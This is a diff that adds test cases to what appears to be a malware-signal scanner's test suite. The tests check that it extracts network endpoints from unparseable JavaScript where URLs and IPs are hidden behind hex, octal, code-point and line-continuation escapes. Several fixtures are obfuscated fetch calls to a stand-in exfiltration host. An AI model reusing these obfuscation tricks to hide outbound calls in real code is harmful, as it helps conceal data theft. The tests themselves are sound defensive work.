@@ -379,6 +379,131 @@ describe("signal extractor", () => {
     });
   });
 
+  describe("escaped values in unparseable files", () => {
+    it("finds a URL behind a glued hex escape", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("\\x20https://exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["domain", "exfil.example.test"]]);
+    });
+
+    it("finds an IPv4 address with an escaped dot", () => {
+      const result = buildSignalSet([
+        source("index.js", 'connect(443, "93.184.216\\x2e34");', "unparseable"),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["ipv4", "93.184.216.34"]]);
+    });
+
+    it("finds an IPv4 address with a legacy octal escape", () => {
+      const result = buildSignalSet([
+        source("index.js", 'connect(443, "93.184.216\\05634");', "unparseable"),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["ipv4", "93.184.216.34"]]);
+    });
+
+    it("finds a URL written with escaped slashes", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("https:\\/\\/exfil.example.test");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("finds a URL after a code point escape with many leading zeros", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("\\u{00000000000000000000000068}ttps://exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("removes a line continuation before scanning", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("https:\\\n//exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("does not report a plain URL twice", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'const pad = "\\x41";\nfetch("https://plain.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints).toHaveLength(1);
+      expect(result.endpoints[0]?.evidence).toHaveLength(1);
+    });
+
+    it("locates the match on the source line of the escape", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          [
+            'const a = "\\x41";',
+            'const b = "\\u0020";',
+            'fetch("\\x20https://exfil.example.test/x");',
+          ].join("\n"),
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints[0]?.evidence[0]?.line).toBe(3);
+    });
+
+    it("scans 2 MB of hex escapes in linear time", () => {
+      const text = "\\x41".repeat(524_288);
+
+      const started = performance.now();
+      buildSignalSet([source("index.js", text, "unparseable")]);
+
+      expect(performance.now() - started).toBeLessThan(3_000);
+    });
+  });
+
   describe("cooked string values (ADR-026)", () => {
     const text = 'fetch("https://plain.test/x");';
     const start = text.indexOf('"') + 1;
